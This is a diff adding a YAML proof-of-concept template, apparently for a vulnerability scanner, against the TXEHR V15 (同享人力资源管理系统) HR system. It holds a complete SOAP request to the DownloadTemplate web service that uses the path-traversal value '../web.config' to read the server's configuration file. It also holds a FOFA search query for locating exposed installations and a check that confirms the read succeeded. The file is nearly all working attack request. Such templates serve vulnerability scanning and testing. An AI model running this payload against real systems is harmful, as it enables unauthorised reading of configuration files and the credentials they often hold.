@@ -1,0 +1,22 @@
+id: poc-yaml-tosharesoft-txehr-v15-downloadtemplate-upload
+info:
+  name: 同享人力资源管理系统-TXEHR V15 DownloadTemplate 文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+requests:
+- method: POST
+  path: /Service/DownloadTemplate.asmx
+  headers:
+    SOAPAction: http://tempuri.org/DownloadFile
+    Content-Type: text/xml; charset=utf-8
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <DownloadFile xmlns=\"http://tempuri.org/\">\n      <path>../web.config</path>\n\
+    \    </DownloadFile>\n  </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"<soap:Body>\") &&\ncontains(body,\"\
+    <DownloadFileResult>\") &&\ncontains(body,\"<?xml version\")\n"
+variables: {}
+transport: http
